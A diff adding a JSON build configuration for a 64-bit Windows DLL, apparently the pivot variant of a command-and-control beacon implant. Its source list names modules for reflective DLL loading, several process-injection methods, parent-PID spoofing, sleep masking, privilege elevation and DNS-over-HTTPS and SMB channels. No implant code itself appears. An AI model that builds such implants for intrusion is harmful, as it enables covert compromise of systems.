@@ -1,0 +1,413 @@
+{
+ "variant": "pivot-x64-wininet",
+ "target_name": "pivot.x64",
+ "clang_cl": "clang-cl",
+ "base_flags": [
+  "--target=x86_64-pc-windows-msvc",
+  "/nologo",
+  "/c",
+  "/O1",
+  "/Ob1",
+  "/GF",
+  "/Gy",
+  "/Os",
+  "/Oi",
+  "/Gy",
+  "/MT",
+  "/GS-",
+  "/W3",
+  "/DBOFWIN_DISABLE",
+  "/DRefLoadSize=",
+  "/DWIN64",
+  "/DNDEBUG",
+  "/D_WINDOWS",
+  "/D_USRDLL",
+  "/DREFLECTIVE_DLL_EXPORTS",
+  "/DWIN_X64",
+  "/DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR",
+  "/DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN",
+  "/D_CRT_SECURE_NO_WARNINGS",
+  "/DLTM_DESC",
+  "/DUSE_LTM",
+  "/DWIN32_LEAN_AND_MEAN",
+  "/I/root/beacon/tomcrypt-headers",
+  "/I/root/beacon/src",
+  "/I/root/beacon/gen",
+  "/I/root/.llvm-cross/xwin-splat/crt/include",
+  "/I/root/.llvm-cross/xwin-splat/sdk/include/ucrt",
+  "/I/root/.llvm-cross/xwin-splat/sdk/include/um",
+  "/I/root/.llvm-cross/xwin-splat/sdk/include/shared"
+ ],
+ "files": [
+  {
+   "src": "src/argue.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/beacon_pivot.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/bformat.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/boff.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/crashdiag.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/build.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/callback.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/channel.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/channel_tcp.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/channel_doh.c",
+   "flags": [
+    "/TP"
+   ]
+  },
+  {
+   "src": "src/client.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/client_smb.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/client_tcp.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/commands.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/elevate.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/encoders.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/execute.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/files.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/filesys.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/functions.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/gargleint.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/sleepmask_gen3.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/gargle_pivot_smb.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/gargle_pivot_tcp.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/hotbeef.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_apcthread.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_createthread.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_hinted.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_mirror.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_rtlcreateuserthread.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_rtlcreateuserthread_wow64.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_setthreadcontext.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_tier2.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/beacon_udc2.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inject_smart.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/inlineexec.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/jobs.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/link.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/link_smb.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/link_tcp.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/metadata.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/parse.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/pivot.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/powershell.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/ppidfriends.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/process_block.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/process_ppid.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/profile.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/proto.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/ps.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/recurse.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/ReflectiveDll.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/ReflectiveLoader.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/security.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/crypto.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/miniprintf.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/locale_stub.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/der_stub.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/settings.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/datastore.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/hostprof.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/syscalls.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/spawn.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/thread.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/tokens.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/track_memory.cpp",
+   "flags": []
+  },
+  {
+   "src": "src/webserver.cpp",
+   "flags": []
+  }
+ ],
+ "link": [
+  "/NOLOGO",
+  "/DLL",
+  "/Brepro",
+  "/ENTRY:_DllMainCRTStartup",
+  "/MACHINE:X64",
+  "/SUBSYSTEM:WINDOWS",
+  "/OPT:REF",
+  "/OPT:ICF",
+  "/OUT:<OUT>/pivot.x64.llvm.dll",
+  "/MAP:<OUT>/pivot.x64.llvm.map",
+  "/libpath:$(XWIN)/crt/lib/x86_64",
+  "/libpath:$(XWIN)/sdk/lib/um/x86_64",
+  "/libpath:$(XWIN)/sdk/lib/ucrt/x86_64",
+  "/libpath:/root/beacon",
+  "kernel32.lib",
+  "user32.lib",
+  "gdi32.lib",
+  "winspool.lib",
+  "comdlg32.lib",
+  "advapi32.lib",
+  "shell32.lib",
+  "ole32.lib",
+  "oleaut32.lib",
+  "uuid.lib",
+  "odbc32.lib",
+  "odbccp32.lib",
+  "<OBJ>/src/argue.cpp.obj",
+  "<OBJ>/src/beacon_pivot.cpp.obj",
+  "<OBJ>/src/bformat.cpp.obj",
+  "<OBJ>/src/boff.cpp.obj",
+  "<OBJ>/src/crashdiag.cpp.obj",
+  "<OBJ>/src/build.cpp.obj",
+  "<OBJ>/src/callback.cpp.obj",
+  "<OBJ>/src/channel.cpp.obj",
+  "<OBJ>/src/channel_tcp.cpp.obj",
+  "<OBJ>/src/channel_doh.c.obj",
+  "<OBJ>/src/client.cpp.obj",
+  "<OBJ>/src/client_smb.cpp.obj",
+  "<OBJ>/src/client_tcp.cpp.obj",
+  "<OBJ>/src/commands.cpp.obj",
+  "<OBJ>/src/elevate.cpp.obj",
+  "<OBJ>/src/encoders.cpp.obj",
+  "<OBJ>/src/execute.cpp.obj",
+  "<OBJ>/src/files.cpp.obj",
+  "<OBJ>/src/filesys.cpp.obj",
+  "<OBJ>/src/functions.cpp.obj",
+  "<OBJ>/src/gargleint.cpp.obj",
+  "<OBJ>/src/sleepmask_gen3.cpp.obj",
+  "<OBJ>/src/gargle_pivot_smb.cpp.obj",
+  "<OBJ>/src/gargle_pivot_tcp.cpp.obj",
+  "<OBJ>/src/hotbeef.cpp.obj",
+  "<OBJ>/src/inject.cpp.obj",
+  "<OBJ>/src/inject_apcthread.cpp.obj",
+  "<OBJ>/src/inject_createthread.cpp.obj",
+  "<OBJ>/src/inject_hinted.cpp.obj",
+  "<OBJ>/src/inject_mirror.cpp.obj",
+  "<OBJ>/src/inject_rtlcreateuserthread.cpp.obj",
+  "<OBJ>/src/inject_rtlcreateuserthread_wow64.cpp.obj",
+  "<OBJ>/src/inject_setthreadcontext.cpp.obj",
+  "<OBJ>/src/inject_tier2.cpp.obj",
+  "<OBJ>/src/beacon_udc2.cpp.obj",
+  "<OBJ>/src/inject_smart.cpp.obj",
+  "<OBJ>/src/inlineexec.cpp.obj",
+  "<OBJ>/src/jobs.cpp.obj",
+  "<OBJ>/src/link.cpp.obj",
+  "<OBJ>/src/link_smb.cpp.obj",
+  "<OBJ>/src/link_tcp.cpp.obj",
+  "<OBJ>/src/metadata.cpp.obj",
+  "<OBJ>/src/parse.cpp.obj",
+  "<OBJ>/src/pivot.cpp.obj",
+  "<OBJ>/src/powershell.cpp.obj",
+  "<OBJ>/src/ppidfriends.cpp.obj",
+  "<OBJ>/src/process_block.cpp.obj",
+  "<OBJ>/src/process_ppid.cpp.obj",
+  "<OBJ>/src/profile.cpp.obj",
+  "<OBJ>/src/proto.cpp.obj",
+  "<OBJ>/src/ps.cpp.obj",
+  "<OBJ>/src/recurse.cpp.obj",
+  "<OBJ>/src/ReflectiveDll.cpp.obj",
+  "<OBJ>/src/ReflectiveLoader.cpp.obj",
+  "<OBJ>/src/security.cpp.obj",
+  "<OBJ>/src/crypto.cpp.obj",
+  "<OBJ>/src/miniprintf.cpp.obj",
+  "<OBJ>/src/locale_stub.cpp.obj",
+  "<OBJ>/src/der_stub.cpp.obj",
+  "<OBJ>/src/settings.cpp.obj",
+  "<OBJ>/src/datastore.cpp.obj",
+  "<OBJ>/src/hostprof.cpp.obj",
+  "<OBJ>/src/syscalls.cpp.obj",
+  "<OBJ>/src/spawn.cpp.obj",
+  "<OBJ>/src/thread.cpp.obj",
+  "<OBJ>/src/tokens.cpp.obj",
+  "<OBJ>/src/track_memory.cpp.obj",
+  "<OBJ>/src/webserver.cpp.obj"
+ ]
+}
